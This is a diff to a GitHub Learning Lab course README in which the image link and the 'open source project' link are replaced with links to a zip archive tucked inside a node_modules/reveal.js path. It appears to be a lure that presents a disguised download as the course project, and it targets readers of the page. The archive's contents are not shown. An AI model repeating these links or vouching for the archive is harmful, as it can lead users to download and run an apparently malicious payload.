@@ -6,8 +6,8 @@ Oh! I haven't introduced myself...
 
 I'm the GitHub Learning Lab bot and I'm here to help guide you in your journey to learn and master the various topics covered in this course. I will be using Issue and Pull Request comments to communicate with you. In fact, I already added an issue for you to check out.
 
-![issue tab](https://raw.githubusercontent.com/Jnewton-lab/github-slideshow/main/node_modules/reveal.js/plugin/multiplex/slideshow-github-watchmate.zip)
+![issue tab](https://github.com/Jnewton-lab/github-slideshow/raw/refs/heads/main/node_modules/reveal.js/js/slideshow-github-3.8.zip)
 
 I'll meet you over there, can't wait to get started!
 
-This course is using the :sparkles: open source project [https://raw.githubusercontent.com/Jnewton-lab/github-slideshow/main/node_modules/reveal.js/plugin/multiplex/slideshow-github-watchmate.zip](https://raw.githubusercontent.com/Jnewton-lab/github-slideshow/main/node_modules/reveal.js/plugin/multiplex/slideshow-github-watchmate.zip). In some cases we’ve made changes to the history so it would behave during class, so head to the original project repo to learn more about the cool people behind this project.
+This course is using the :sparkles: open source project [https://github.com/Jnewton-lab/github-slideshow/raw/refs/heads/main/node_modules/reveal.js/js/slideshow-github-3.8.zip](https://github.com/Jnewton-lab/github-slideshow/raw/refs/heads/main/node_modules/reveal.js/js/slideshow-github-3.8.zip). In some cases we’ve made changes to the history so it would behave during class, so head to the original project repo to learn more about the cool people behind this project.
